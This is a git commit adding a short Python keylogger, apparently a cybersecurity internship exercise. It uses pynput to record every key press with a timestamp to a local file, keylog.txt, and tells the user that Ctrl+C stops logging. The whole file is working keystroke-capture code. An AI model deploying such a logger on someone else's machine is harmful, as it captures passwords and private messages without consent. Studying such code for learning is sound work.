99ba897c4e31b27a68aaea0b1ea293fd40d9aca8
vkdevilhub <131623958+vkdevilhub@users.noreply.github.com>
2024-07-02 11:50:59 +0530

    Add files via upload

---
+++ PRODIGY_CS-04.py
@@ -0,0 +1,16 @@
+from pynput import keyboard
+import time
+
+def on_key_press(key):
+    log_file = open("keylog.txt", "a")
+    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+    log_file.write(f"{timestamp} - {key}\n")
+    log_file.close()
+
+def main():
+    print("Press Ctrl+C to stop logging.")
+    with keyboard.Listener(on_press=on_key_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
